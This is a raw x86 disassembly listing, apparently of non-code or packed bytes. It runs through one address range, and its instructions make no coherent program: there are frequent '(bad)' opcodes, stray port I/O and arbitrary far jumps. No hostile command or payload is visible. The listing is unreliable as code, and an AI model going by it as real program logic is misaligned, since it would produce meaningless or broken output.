  420c3b:	adc    DWORD PTR gs:[edx],eax
  420c3e:	gs cmp al,0x40
  420c41:	or     eax,0x9eb9663d
  420c46:	out    dx,eax
  420c47:	fcmovb st,st(7)
  420c49:	mov    cl,0xca
  420c4b:	stc    
  420c4c:	inc    ebp
  420c4d:	xchg   ebx,eax
  420c4e:	xor    dl,0x27
  420c51:	pop    edx
  420c52:	je     0x420ca6
  420c54:	lds    eax,FWORD PTR [esi+0x1209d80]
  420c5a:	pop    esp
  420c5b:	jl     0x420c71
  420c5d:	clc    
  420c5e:	push   ss
  420c5f:	leave  
  420c60:	(bad)  
  420c61:	xchg   ebp,eax
  420c62:	data16 addr16 in al,0xa9
  420c66:	popa   
  420c67:	mov    dl,0x41
  420c69:	cdq    
  420c6a:	in     eax,dx
  420c6b:	sbb    ch,BYTE PTR fs:[ecx+0x48]
  420c6f:	loopne 0x420c78
  420c71:	and    eax,0x86f91982
  420c76:	mov    al,cl
  420c78:	inc    edi
  420c79:	lock or DWORD PTR [ecx+ebx*1-0x2a],eax
  420c7e:	push   esi
  420c7f:	sbb    eax,0xcfc981f1
  420c84:	out    dx,al
  420c85:	jecxz  0x420cbe
  420c87:	data16 mov cl,0x48
  420c8a:	ins    DWORD PTR es:[edi],dx
  420c8b:	out    dx,eax
  420c8c:	and    al,0xbf
  420c8e:	and    al,0x6f
  420c90:	pop    edx
  420c91:	int    0x74
  420c93:	lahf   
  420c94:	mov    ah,0x79
  420c96:	cmp    dh,cl
  420c98:	xchg   ebx,eax
  420c99:	xchg   edi,eax
  420c9a:	cwde   
  420c9b:	push   0x227aeabc
  420ca0:	push   ebx
  420ca1:	pop    ebx
  420ca2:	sbb    al,0x3a
  420ca4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ca5:	xchg   ecx,eax
  420ca6:	mov    dh,0x45
  420ca8:	jb     0x420c30
  420caa:	push   ds
  420cab:	iret   
  420cac:	ins    DWORD PTR es:[edi],dx
  420cad:	daa    
  420cae:	push   esi
  420caf:	pop    esi
  420cb0:	push   ebp
  420cb1:	lock push esp
  420cb3:	in     eax,0x50
  420cb5:	mov    ah,0x4
  420cb7:	pop    ebp
  420cb8:	push   0x14d6d0c0
  420cbd:	jae    0x420c7b
  420cbf:	xor    cl,al
  420cc1:	call   0x873b:0x1fe46549
  420cc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cc9:	add    al,0x1a
  420ccb:	jmp    0x96de:0x9402e64f
  420cd2:	in     al,dx
  420cd3:	xchg   esi,eax
  420cd4:	sbb    ebx,DWORD PTR [eax-0x69680936]
  420cda:	ja     0x420cdd
  420cdc:	das    
  420cdd:	int    0x65
  420cdf:	rol    BYTE PTR es:[edi-0x76],0x2d
  420ce4:	sahf   
  420ce5:	push   cs
  420ce6:	into   
  420ce7:	aad    0xde
  420ce9:	add    esi,ebx
  420ceb:	mov    ds:0xd55dbd50,eax
  420cf0:	add    BYTE PTR [ecx+0x69],dl
  420cf3:	dec    ebx
  420cf4:	mov    dh,0x70
  420cf6:	in     eax,dx
  420cf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cf8:	shl    ch,cl
  420cfa:	sahf   
  420cfb:	mov    dl,0xa9
  420cfd:	imul   ebp,eax,0x1f0df1de
  420d03:	popa   
  420d04:	stos   DWORD PTR es:[edi],eax
  420d05:	inc    DWORD PTR [edx+0x2cd8f5fa]
  420d0b:	xchg   ebx,eax
  420d0c:	add    cl,BYTE PTR [ebp+0x24]
  420d0f:	pop    edx
  420d10:	adc    BYTE PTR [edi],bl
  420d12:	fadd   DWORD PTR [ebx+eax*2-0x30a89e81]
  420d19:	hlt    
  420d1a:	loopne 0x420d24
  420d1c:	mov    esi,0xa54c828b
  420d21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d22:	daa    
  420d23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d24:	enter  0xf69d,0x11
  420d28:	pop    edi
  420d29:	sti    
  420d2a:	or     al,0xeb
  420d2c:	pop    ebx
  420d2d:	mov    esi,0x30f54a48
  420d32:	neg    BYTE PTR [ebx-0x6b97279b]
  420d38:	push   es
  420d39:	repz push es
  420d3b:	add    al,dl
  420d3d:	cmp    dl,BYTE PTR [ebp+esi*8-0x443253cb]
  420d44:	add    bl,BYTE PTR [edi-0x151acf07]
  420d4a:	mov    ch,0xc7
  420d4c:	xlat   BYTE PTR ds:[ebx]
  420d4d:	add    esi,DWORD PTR [ebp-0x5b95bc3]
  420d53:	adc    edx,DWORD PTR [ebp-0x5e]
  420d56:	gs inc eax
  420d58:	push   edx
  420d59:	aam    0xe8
  420d5b:	jbe    0x420ce0
  420d5d:	es mov edx,0x1f44c288
  420d63:	(bad)  
  420d64:	icebp  
  420d65:	iret   
  420d66:	sub    edi,edx
  420d68:	xchg   esi,eax
  420d69:	inc    esi
  420d6a:	mov    ecx,0x47d9e356
  420d6f:	inc    esi
  420d70:	jmp    0x420d10
  420d72:	cs xor eax,0x41d50a64
  420d78:	push   edi
  420d79:	mov    esp,0x977b0956
  420d7e:	mov    ebx,0x818f8918
  420d83:	mov    al,0xa1
  420d85:	adc    eax,0x3f1005e7
  420d8a:	mov    dl,0x98
  420d8c:	and    DWORD PTR [eax+edi*4+0x2e104611],ebx
  420d93:	cwde   
  420d94:	arpl   bp,bx
  420d96:	and    eax,0x9bf03932
  420d9b:	in     eax,dx
  420d9c:	(bad)  
  420d9d:	stos   BYTE PTR es:[edi],al
  420d9e:	mov    bl,0x63
  420da0:	aas    
  420da1:	and    eax,0x9767c9d
  420da6:	ja     0x420d2f
  420da8:	inc    esi
  420da9:	lea    ebx,[esi]
  420dab:	les    esp,FWORD PTR [ebx-0x61]
  420dae:	lock mov ebp,0x96561a6a
  420db4:	stos   BYTE PTR es:[edi],al
  420db5:	mov    WORD PTR [ebp-0x649a7f71],gs
  420dbb:	sbb    eax,0x660753ac
  420dc0:	int3   
  420dc1:	clc    
  420dc2:	cdq    
  420dc3:	(bad)  
  420dc4:	hlt    
  420dc5:	stos   DWORD PTR es:[edi],eax
  420dc6:	ret    0xc952
  420dc9:	sbb    eax,0x33712b0a
  420dce:	(bad)  
  420dcf:	in     eax,0xcb
  420dd1:	clc    
  420dd2:	cmp    bh,BYTE PTR [ebx+0x9]
  420dd5:	add    edi,DWORD PTR [ebp+ebp*1-0x41]
  420dd9:	adc    edi,DWORD PTR [ebx]
  420ddb:	(bad)  
  420ddc:	pop    ss
  420ddd:	jno    0x420e2c
  420ddf:	pop    esp
  420de0:	mov    DWORD PTR [eax+ebp*4-0x2d],ebp
  420de4:	and    ch,BYTE PTR [edx-0x34ec157e]
  420dea:	pop    esp
  420deb:	pop    esp
  420dec:	popf   
  420ded:	push   ebp
  420dee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420def:	dec    eax
  420df0:	mov    dl,0xa8
  420df2:	ja     0x420e23
  420df4:	call   0x4ab32a4c
  420df9:	retf   
  420dfa:	fnstcw WORD PTR ds:0x723032ec
  420e00:	pop    edi
  420e01:	in     al,0xbb
  420e03:	mov    ds:0xce9cb796,eax
  420e08:	and    BYTE PTR [ecx+edx*4-0x1],bl
  420e0c:	mov    esi,DWORD PTR [ebp+0x63]
  420e0f:	xor    esi,DWORD PTR [eax]
  420e11:	dec    DWORD PTR [esi]
  420e13:	xor    al,bh
  420e15:	pop    ss
  420e16:	xchg   edx,eax
  420e17:	mov    BYTE PTR [eax+0x4415f691],bl
  420e1d:	repnz lock pop es
  420e20:	arpl   WORD PTR [edi+0x5ae4ec37],si
  420e26:	sbb    al,0x8
  420e28:	and    eax,0xc60c1cac
  420e2d:	or     esp,DWORD PTR [esi+0x3fdfde98]
  420e33:	test   DWORD PTR [edx-0x3a598abc],esp
  420e39:	addr16 pop ebp
  420e3b:	shr    ch,0x80
  420e3e:	xchg   DWORD PTR [ebp-0x339ab091],esi
  420e44:	int    0xa0
  420e46:	enter  0xf,0x67
  420e4a:	and    BYTE PTR [edx-0x45],dl
  420e4d:	int    0xe2
  420e4f:	in     al,dx
  420e50:	jbe    0x420df3
  420e52:	sub    edi,0x5ef0cd32
  420e58:	sub    al,0xd6
  420e5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e5c:	fild   DWORD PTR [ebx+edx*1-0x58032229]
  420e63:	mov    bh,BYTE PTR [eax]
  420e65:	inc    edi
  420e66:	and    bl,dh
  420e68:	leave  
  420e69:	push   ds
  420e6a:	or     al,0x3a
  420e6c:	or     al,0x38
  420e6e:	je     0x420ebd
  420e70:	fisttp QWORD PTR [edx]
  420e72:	jns    0x420e7b
  420e74:	shl    BYTE PTR [ebp+0x58],0x1b
  420e78:	lock push ss
  420e7a:	loop   0x420e96
  420e7c:	frstor [ebp+0x46]
  420e7f:	pop    ds
  420e80:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  420e82:	adc    DWORD PTR [eax+0x4d],ecx
  420e85:	aam    0xc2
  420e87:	pop    esp
  420e88:	push   esi
  420e89:	push   ss
  420e8a:	jnp    0x420ec0
  420e8c:	shl    BYTE PTR [ecx+0xa4bf9ce],cl
  420e92:	fs mov esi,0xfb703324
  420e98:	xchg   edx,eax
  420e99:	mov    edx,0xfb5e16ab
  420e9e:	popf   
  420e9f:	int    0x37
  420ea1:	dec    edx
  420ea2:	nop
  420ea3:	and    DWORD PTR [ebx],ecx
  420ea5:	adc    al,0x7e
  420ea7:	call   0x273278e9
  420eac:	pop    esi
  420ead:	(bad)  
  420eae:	fisub  DWORD PTR [edx-0x60]
  420eb1:	jecxz  0x420f21
  420eb3:	sti    
  420eb4:	and    BYTE PTR [eax-0x1cd8a8fc],bl
  420eba:	mov    cl,0x5e
  420ebc:	push   ebp
  420ebd:	ss xchg ebp,eax
  420ebf:	cdq    
  420ec0:	sub    DWORD PTR [eax+0x73a0f356],ebx
  420ec6:	cmp    al,0xed
  420ec8:	add    edi,DWORD PTR [esi+0x4745dcd5]
  420ece:	fwait
  420ecf:	inc    edx
  420ed0:	xchg   ebx,eax
  420ed1:	dec    edi
  420ed2:	mov    edi,0x1e976e5
  420ed7:	add    al,0x22
  420ed9:	sbb    eax,DWORD PTR [esi-0x1d]
  420edc:	pop    ss
  420edd:	jmp    0xc4caf018
  420ee2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ee3:	mov    esp,0x5d21d362
  420ee8:	out    0x51,al
  420eea:	fdivp  st(1),st
  420eec:	fwait
  420eed:	mov    esi,0x88fc2b0a
  420ef2:	or     DWORD PTR [edi],esi
  420ef4:	loop   0x420f2b
  420ef6:	retf   0x86a8
  420ef9:	out    dx,eax
  420efa:	or     cl,ch
  420efc:	loop   0x420edc
  420efe:	aad    0xe2
  420f00:	cld    
  420f01:	sub    BYTE PTR [edi-0x53],cl
  420f04:	sub    DWORD PTR [ebx-0x21ad2cb1],edi
  420f0a:	jo     0x420f71
  420f0c:	sub    DWORD PTR [edx],ecx
  420f0e:	jmp    0x420f18
  420f10:	ret    0x6f6b
  420f13:	dec    eax
  420f14:	fnclex 
  420f16:	adc    edi,ebp
  420f18:	sti    
  420f19:	jns    0x420f11
  420f1b:	icebp  
  420f1c:	int3   
  420f1d:	xor    eax,0xc09a709a
  420f22:	mov    esp,0x8f5eef6b
  420f27:	sub    dh,BYTE PTR [eax-0x1a2ff04d]
  420f2d:	push   ds
  420f2e:	aam    0xc1
  420f30:	jl     0x420ef3
  420f32:	mov    ?,WORD PTR [eax]
  420f34:	retf   
  420f35:	pop    eax
  420f36:	mov    eax,0x289dbb0d
  420f3b:	jne    0x420f32
  420f3d:	sub    esi,DWORD PTR [ebp-0x27ded764]
  420f43:	pop    esi
  420f44:	or     BYTE PTR [eax],bh
  420f46:	push   esi
  420f47:	mov    DWORD PTR [ebp-0x4f223843],edx
  420f4d:	jmp    0x4845555e
  420f52:	push   ss
  420f53:	(bad)  
  420f54:	mov    al,0x53
  420f56:	into   
  420f57:	adc    DWORD PTR [eax],edx
  420f59:	xor    DWORD PTR [ebx-0x351039e9],ebp
  420f5f:	cmp    BYTE PTR ds:0xa6233c3d,ah
  420f65:	mov    ch,0xf3
  420f67:	loopne 0x420f89
  420f69:	dec    ecx
  420f6a:	(bad)  
  420f6c:	out    dx,eax
  420f6d:	call   0xb816459e
  420f72:	push   esi
  420f73:	scas   al,BYTE PTR es:[edi]
  420f74:	lods   eax,DWORD PTR ds:[esi]
  420f75:	(bad)  
  420f76:	gs nop
  420f78:	lahf   
  420f79:	or     DWORD PTR [ebp+0x54],0xfffffff1
  420f7d:	cdq    
  420f7e:	je     0x420fbd
  420f80:	test   eax,0x83f880f4
  420f85:	pop    ss
  420f86:	rol    DWORD PTR [ecx],cl
  420f88:	in     eax,dx
  420f89:	call   DWORD PTR [ebp+0x58]
  420f8c:	mov    ah,0x9b
  420f8e:	pop    eax
  420f8f:	aaa    
  420f90:	sbb    al,0x13
  420f92:	rol    BYTE PTR [ecx],1
  420f94:	mov    edx,0x5366d801
  420f99:	pushf  
  420f9a:	out    0xff,eax
  420f9c:	stos   DWORD PTR es:[edi],eax
  420f9d:	adc    ecx,DWORD PTR [ebx]
  420f9f:	mov    ecx,0xb87d8b17
  420fa4:	and    bh,BYTE PTR [esp+eiz*2-0x60]
  420fa8:	jns    0x421018
  420faa:	inc    edi
  420fab:	adc    eax,0x3ba2d4ab
  420fb0:	mov    dh,0x56
  420fb2:	jae    0x420f37
  420fb4:	xchg   edx,eax
  420fb5:	dec    ecx
  420fb6:	add    edi,DWORD PTR ds:0x3576859a
  420fbc:	add    eax,0xaff4ef50
  420fc1:	cmp    bl,al
  420fc3:	pop    edi
  420fc4:	jp     0x420f8b
  420fc6:	xchg   esp,eax
  420fc7:	mov    edi,0xd1ca2790
  420fcc:	sahf   
  420fcd:	adc    al,0x1f
  420fcf:	daa    
  420fd0:	pop    ecx
  420fd1:	sbb    al,0xa8
  420fd3:	and    BYTE PTR [ebx+ebx*4+0x1365a4c4],al
  420fda:	leave  
  420fdb:	jns    0x420f97
  420fdd:	imul   esp,DWORD PTR [esi+0x202d510d],0x8ff16b86
  420fe7:	mov    ebp,0x7ae57a06
  420fec:	dec    ebx
  420fed:	pop    eax
  420fee:	mov    DWORD PTR [esi+esi*1+0x8],edx
  420ff2:	out    dx,eax
  420ff3:	sbb    eax,0x99cd004e
  420ff8:	lock retf 0xfaf1
  420ffc:	icebp  
  420ffd:	xchg   esi,eax
  420ffe:	nop
  420fff:	jo     0x420fee
  421001:	ins    DWORD PTR es:[edi],dx
  421002:	sar    BYTE PTR [edi+0x63],cl
  421005:	sub    eax,0x6d48e710
  42100a:	xchg   edx,eax
  42100b:	push   cs
  42100c:	idiv   BYTE PTR [ebp+edx*4-0x740de66b]
  421013:	ja     0x421060
  421015:	mov    esi,0x62071698
  42101a:	lahf   
  42101b:	cmc    
  42101c:	mov    ecx,0x89baef0a
  421021:	daa    
  421022:	inc    ebp
  421023:	xor    al,0x61
  421025:	hlt    
  421026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421027:	stc    
  421028:	sbb    DWORD PTR [ecx],0x27ff9c45
  42102e:	(bad)  
  42102f:	stos   BYTE PTR es:[edi],al
  421030:	add    al,0x61
  421032:	out    0x4,eax
  421034:	mov    BYTE PTR [edx+0x6e20512],dl
  42103a:	push   0x871d8384
  42103f:	retf   0xd11a
  421042:	xor    BYTE PTR [eax-0x1c841b2d],0xf0
  421049:	retf   0x8b54
  42104c:	test   DWORD PTR [ebx],ecx
  42104e:	fbstp  TBYTE PTR [edx-0x31]
  421051:	test   DWORD PTR [ebp+esi*1-0x5c],ebp
  421055:	sbb    eax,0xe2de6801
  42105a:	repz xor DWORD PTR [esi],ebp
  42105d:	cmp    BYTE PTR [esi+0x64c65506],al
  421063:	fs jae 0x421055
  421066:	add    DWORD PTR [ecx+0x3239a548],esp
  42106c:	data16 sub al,0xe4
  42106f:	dec    DWORD PTR [edx-0xa249402]
  421075:	dec    ebp
  421076:	bound  ecx,QWORD PTR [edx-0x4cf88058]
  42107c:	ja     0x421058
  42107e:	repz out 0xcd,al
  421081:	mov    bl,0x26
  421083:	(bad)  
  421084:	add    esp,DWORD PTR [edi]
  421086:	int    0x78
  421088:	enter  0x857d,0x5a
  42108c:	lods   eax,DWORD PTR ds:[esi]
  42108d:	cmp    eax,edi
  42108f:	mov    ds,WORD PTR [ebp-0x5eae3c34]
  421095:	gs or  dh,bl
  421098:	jle    0x421049
  42109a:	daa    
  42109b:	rol    DWORD PTR [ecx-0x4bd3c53],cl
  4210a1:	mov    BYTE PTR [edx],ah
  4210a3:	pop    edi
  4210a4:	cli    
  4210a5:	xchg   ecx,eax
  4210a6:	cmp    eax,0x8a029bd1
  4210ab:	mov    bl,0xb4
  4210ad:	in     al,0xe7
  4210af:	test   BYTE PTR [ebx-0x6e634a99],dl
  4210b5:	lea    eax,[esi-0x11]
  4210b8:	mov    al,ds:0x798e8781
  4210bd:	sbb    al,BYTE PTR [edx-0x76]
  4210c0:	lods   eax,DWORD PTR ds:[esi]
  4210c1:	gs pop ebp
  4210c3:	jae    0x42108b
  4210c5:	das    
  4210c6:	sub    bl,BYTE PTR [esi+ebp*8-0x25]
  4210ca:	jp     0x4210d3
  4210cc:	ja     0x421127
  4210ce:	xchg   esp,eax
  4210cf:	retf   0x55f0
  4210d2:	mov    edx,0xf0d10cb1
  4210d7:	loop   0x4210d0
  4210d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210da:	sbb    ecx,ebx
  4210dc:	(bad)  
  4210de:	mov    ebx,0xeb64de35
  4210e3:	mov    ds:0xd143a3a6,eax
  4210e8:	retf   
  4210e9:	cmp    eax,0xd36b94a
  4210ee:	sub    eax,DWORD PTR [eax+0x283f7508]
  4210f4:	push   eax
  4210f5:	mov    al,ds:0xb57b166d
  4210fa:	mov    al,BYTE PTR [esi+0x505c720e]
  421100:	sub    eax,0x2852a8d9
  421105:	repnz mov eax,ds:0xbcf6d0ba
  42110b:	jae    0x42113a
  42110d:	stos   BYTE PTR es:[edi],al
  42110e:	push   ebp
  42110f:	or     ch,BYTE PTR [ecx+0x6d]
  421112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421113:	inc    esp
  421114:	sti    
  421115:	push   esp
  421116:	jmp    0x42114b
  421118:	push   esi
  421119:	mov    ebx,0xe41f9b12
  42111e:	xor    ebp,edi
  421120:	cmp    BYTE PTR [ebp+0x15],bl
  421123:	std    
  421124:	test   ecx,edi
  421126:	ss test al,0x93
  421129:	cmp    esp,DWORD PTR [esi+ebp*1]
  42112c:	(bad)  
  42112d:	ins    DWORD PTR es:[edi],dx
  42112e:	sbb    dh,BYTE PTR [eax-0x1874bc94]
  421134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421135:	in     eax,dx
  421136:	cmp    ebp,DWORD PTR ds:0xe8dc29a9
  42113c:	mov    edi,DWORD PTR [ebp-0x49aeee12]
  421142:	(bad)  
  421143:	(bad)  
  421144:	xor    al,0x79
  421146:	(bad)  
  421147:	icebp  
  421148:	xlat   BYTE PTR ds:[ebx]
  421149:	push   ebp
  42114a:	idiv   DWORD PTR [ebp-0x50]
  42114d:	pusha  
  42114e:	mov    al,ds:0xcd3758df
  421153:	cli    
  421154:	pop    ebp
  421155:	cmc    
  421156:	stc    
  421157:	xor    al,0x8
  421159:	pusha  
  42115a:	call   0x51635c19
  42115f:	and    eax,0x5cefc5c
  421164:	push   eax
  421165:	pusha  
  421166:	in     eax,0xc0
  421168:	clc    
  421169:	pop    edi
  42116a:	cmc    
  42116b:	rol    cl,cl
  42116d:	addr16 out 0xe0,eax
  421170:	lock rol BYTE PTR [ebp+0x4cd9b13c],cl
  421177:	push   0x46f54b12
  42117c:	in     eax,0x33
  42117e:	xchg   ebp,eax
  42117f:	add    ecx,DWORD PTR [edx+ecx*8+0x35]
  421183:	jmp    0xffea9c29
  421188:	xor    ebp,DWORD PTR [esi-0x1eb3cbda]
  42118e:	bound  esp,QWORD PTR [ecx+0x105fa41f]
  421194:	(bad)
  421197:	cmp    esi,0xffffff89
  42119a:	stos   BYTE PTR es:[edi],al
  42119b:	aaa    
  42119c:	(bad)  
  42119d:	aam    0xef
  42119f:	sbb    al,0x8e
  4211a1:	push   cs
  4211a2:	das    
  4211a3:	es push es
  4211a5:	sbb    esi,ecx
  4211a7:	stos   DWORD PTR es:[edi],eax
  4211a8:	aaa    
  4211a9:	push   cs
  4211aa:	jmp    0x42114a
  4211ac:	scas   eax,DWORD PTR es:[edi]
  4211ad:	imul   ebp,ebx,0x87646d21
  4211b3:	dec    edx
  4211b4:	test   BYTE PTR fs:[esi+0x20],0x58
  4211b9:	mov    bl,0xc1
  4211bb:	ffree  st(1)
  4211bd:	mov    edi,ecx
  4211bf:	dec    esp
  4211c0:	cld    
  4211c1:	(bad)  
  4211c2:	or     ebp,DWORD PTR [esp+edi*4-0x50317b15]
  4211c9:	xchg   BYTE PTR [esi-0x2f0bb06f],ah
  4211cf:	enter  0x2c4b,0x27
  4211d3:	inc    edx
  4211d4:	jns    0x421186
  4211d6:	stc    
  4211d7:	ret    
  4211d8:	ja     0x421248
  4211da:	add    eax,0xc2db72ab
  4211df:	rcl    DWORD PTR [esi+0x52],cl
  4211e2:	or     bl,BYTE PTR [esi]
  4211e4:	je     0x421192
  4211e6:	fidivr WORD PTR [esi]
  4211e8:	xchg   DWORD PTR [edi+0x64d277ea],ebp
  4211ee:	int3   
  4211ef:	stos   DWORD PTR es:[edi],eax
  4211f0:	xchg   ebp,eax
  4211f1:	push   ecx
  4211f2:	pop    es
  4211f3:	(bad)  
  4211f4:	sbb    DWORD PTR [edx+0x22d40dfe],ebx
  4211fa:	inc    eax
  4211fb:	aam    0x4c
  4211fd:	push   ds
  4211fe:	jae    0x4211db
  421200:	pop    ebp
  421201:	fucom  st(7)
  421203:	jnp    0x4211ac
  421205:	fwait
  421206:	in     eax,dx
  421207:	push   ss
  421208:	shl    BYTE PTR ds:0xbe43459a,0x55
  42120f:	into   
  421210:	mov    esp,0xc71d3883
  421215:	inc    eax
  421216:	pop    ebx
  421217:	idiv   edx
  421219:	jp     0x421213
  42121b:	xchg   DWORD PTR [eax],eax
  42121d:	inc    eax
  42121e:	lods   al,BYTE PTR ds:[esi]
  42121f:	imul   edi,DWORD PTR [ecx+0x7946484e],0xffffffdb
  421226:	pop    edi
  421227:	mov    al,BYTE PTR [edx-0x4d]
  42122a:	pushf  
  42122b:	not    DWORD PTR [edi+0x472cb2e8]
  421231:	and    DWORD PTR [esi],ecx
  421233:	mov    esi,0x9ce7825e
  421238:	adc    DWORD PTR [ecx],ebx
  42123a:	sub    al,0x3
  42123c:	or     BYTE PTR es:[eax+0x674301c],bh
  421243:	stc    
  421244:	push   eax
  421245:	outs   dx,BYTE PTR ds:[esi]
  421246:	xchg   ebx,eax
  421247:	push   0xc4036b4e
  42124c:	xchg   edx,eax
  42124d:	jb     0x421296
  42124f:	test   DWORD PTR [eax-0x18],ebp
  421252:	rcr    DWORD PTR [edi],0x21
  421255:	mov    esi,0x74b5997b
  42125a:	xchg   esp,eax
  42125b:	fwait
  42125c:	loope  0x421269
  42125e:	adc    al,0xae
  421260:	mov    ebp,0x9366e29c
  421265:	ret    
  421266:	or     eax,0x3a3bd71b
  42126b:	add    al,0x30
  42126d:	push   es
  42126e:	add    DWORD PTR [esi],esp
  421270:	pop    esp
  421271:	retf   
  421272:	jno    0x4212ed
  421274:	push   edx
  421275:	push   0x63
  421277:	jns    0x42126f
  421279:	sub    eax,0xd5085eaa
  42127e:	xchg   BYTE PTR [eax-0x2d379a5e],dh
  421284:	push   ss
  421285:	std    
  421286:	scas   al,BYTE PTR es:[edi]
  421287:	xchg   esp,eax
  421288:	jl     0x4212a7
  42128a:	(bad)  
  42128b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42128c:	inc    ecx
  42128d:	add    ebp,DWORD PTR [ebp+0x53]
  421290:	stos   DWORD PTR es:[edi],eax
  421291:	mov    dh,al
  421293:	movntq QWORD PTR [edx+0x41],mm4
  421297:	outs   dx,BYTE PTR ds:[esi]
  421298:	sub    edx,DWORD PTR [edx-0x78322ec5]
  42129e:	jo     0x421256
  4212a0:	lods   al,BYTE PTR ds:[esi]
  4212a1:	sbb    dl,BYTE PTR [eax+0x56]
  4212a4:	mov    ds:0x7bcc6ff0,al
  4212a9:	rep outs dx,DWORD PTR ds:[esi]
  4212ab:	or     al,0x1b
  4212ad:	fs scas al,BYTE PTR es:[edi]
  4212af:	leave  
  4212b0:	dec    ecx
  4212b1:	shl    BYTE PTR [ecx+0x43],0x6d
  4212b5:	sub    BYTE PTR [esi+0x2d],bl
  4212b8:	pop    edx
  4212b9:	sub    eax,0x2987d0c9
  4212be:	mov    al,ds:0x5a7d64fa
  4212c3:	fidivr WORD PTR [eax]
  4212c5:	pop    ds
  4212c6:	ret    0x3444
  4212c9:	leave  
  4212ca:	jl     0x4212a8
  4212cc:	fs dec ebp
  4212ce:	mul    cl
  4212d0:	xchg   BYTE PTR [eax+0x3f],cl
  4212d3:	ret    0x8464
  4212d6:	test   eax,0xa6fbb73
  4212db:	push   eax
  4212dc:	mov    ch,0xbe
  4212de:	jmp    0x77b6:0xd87e2187
  4212e5:	test   DWORD PTR [esi+0x119ef0ff],ebx
  4212eb:	add    bh,BYTE PTR [ecx-0x1a9516ce]
  4212f1:	leave  
  4212f2:	mov    al,ds:0x845cd1e1
  4212f8:	jge    0x421289
  4212fa:	mov    DWORD PTR ss:[ecx+0x20],edi
  4212fe:	cdq    
  4212ff:	sbb    ecx,edx
  421301:	cmp    cl,cl
  421303:	sti    
  421304:	inc    edi
  421305:	dec    eax
  421306:	or     DWORD PTR [esi-0x50],ebx
  421309:	mov    bh,0x8
  42130b:	outs   dx,BYTE PTR ds:[esi]
  42130c:	dec    edx
  42130d:	sub    eax,0x4a66dcfe
  421312:	or     eax,0x581afdb2
  421317:	inc    ebp
  421318:	mov    eax,0x8b10f934
  42131d:	cld    
  42131e:	mov    WORD PTR [edi-0x16],?
  421321:	and    BYTE PTR [ecx],cl
  421323:	popa   
  421324:	ret    0xd249
  421327:	mov    ecx,0x4e7ad10f
  42132c:	fcmovbe st,st(3)
  42132e:	jge    0x4212bf
  421330:	inc    ebx
  421331:	pop    ds
  421332:	sub    DWORD PTR [eax],esp
  421334:	adc    al,0xfc
  421336:	fsub   QWORD PTR [ebx-0x37c02618]
  42133c:	mov    ch,bl
  42133e:	sub    al,bh
  421340:	sub    BYTE PTR ds:0x5fdcc0ad,cl
  421346:	es aad 0x57
  421349:	aaa    
  42134a:	out    dx,al
  42134b:	push   0xbf7afcb2
  421350:	out    dx,ax
  421352:	adc    ch,BYTE PTR [edx]
  421354:	lods   eax,DWORD PTR ds:[esi]
  421355:	pop    edx
  421356:	pushf  
  421357:	jae    0x421380
  421359:	push   cs
  42135a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42135b:	imul   DWORD PTR ds:[ebp+0x31]
  42135f:	cmp    BYTE PTR [ecx+ebp*4+0x48],bl
  421363:	retf   
  421364:	data16 icebp 
  421366:	push   ebx
  421367:	aad    0x2d
  421369:	jmp    0xea745fd3
  42136e:	sti    
  42136f:	in     al,0x6a
  421371:	test   DWORD PTR [eax-0x2d4164ec],ebp
  421377:	or     eax,esi
  421379:	mov    ds:0xf320b7b1,al
  42137e:	pop    ecx
  42137f:	mov    ch,0xdd
  421381:	cmc    
  421382:	stos   DWORD PTR es:[edi],eax
  421383:	push   edi
  421384:	jns    0x4213ee
  421386:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421387:	test   BYTE PTR [ebp-0x1b8327a3],al
  42138d:	clc    
  42138e:	add    al,0x17
  421390:	pop    ecx
  421391:	sbb    eax,0xfe652b21
  421396:	test   DWORD PTR [esi],edx
  421398:	inc    esp
  421399:	sub    al,0xaf
  42139b:	mov    DWORD PTR [ebx],ebp
  42139d:	fdivr  QWORD PTR [esp+eiz*8+0x16]
  4213a1:	pop    es
  4213a2:	jge    0x42132f
  4213a4:	adc    BYTE PTR [ecx],cl
  4213a6:	aas    
  4213a7:	cmp    ecx,DWORD PTR [edx-0x63781153]
  4213ad:	and    BYTE PTR ds:0x493ec424,bh
  4213b3:	mov    ebx,0x526b6277
  4213b8:	xchg   esi,eax
  4213b9:	adc    esp,DWORD PTR [eax-0x5ed94dc4]
  4213bf:	adc    ah,BYTE PTR [edi+0x2be3af42]
  4213c5:	pop    edi
  4213c6:	scas   eax,DWORD PTR es:[edi]
  4213c7:	sahf   
  4213c8:	cmc    
  4213c9:	call   0xe82c:0xfce18304
  4213d0:	pop    ss
  4213d1:	enter  0xbd05,0xdb
  4213d5:	jmp    0x6790c645
  4213da:	aad    0xb5
  4213dc:	jno    0x42143a
  4213de:	je     0x421389
  4213e0:	sar    al,cl
  4213e2:	jl     0x4213fc
  4213e4:	mov    WORD PTR [eax+0x2cf7e96],?
  4213ea:	ins    DWORD PTR es:[edi],dx
  4213eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213ec:	or     esi,DWORD PTR [eax-0x63]
  4213ef:	dec    eax
  4213f0:	lea    edx,[ebx+0x8]
  4213f3:	and    DWORD PTR [ebx],edi
  4213f5:	retf   
  4213f6:	jbe    0x42137d
  4213f8:	add    edx,edx
  4213fa:	mov    esp,0x4d825ecd
  4213ff:	cli    
  421400:	mov    cl,0xd
  421402:	jg     0x421405
  421404:	pop    ecx
  421405:	imul   ebp,DWORD PTR [edi],0xe0029ebe
  42140b:	inc    esi
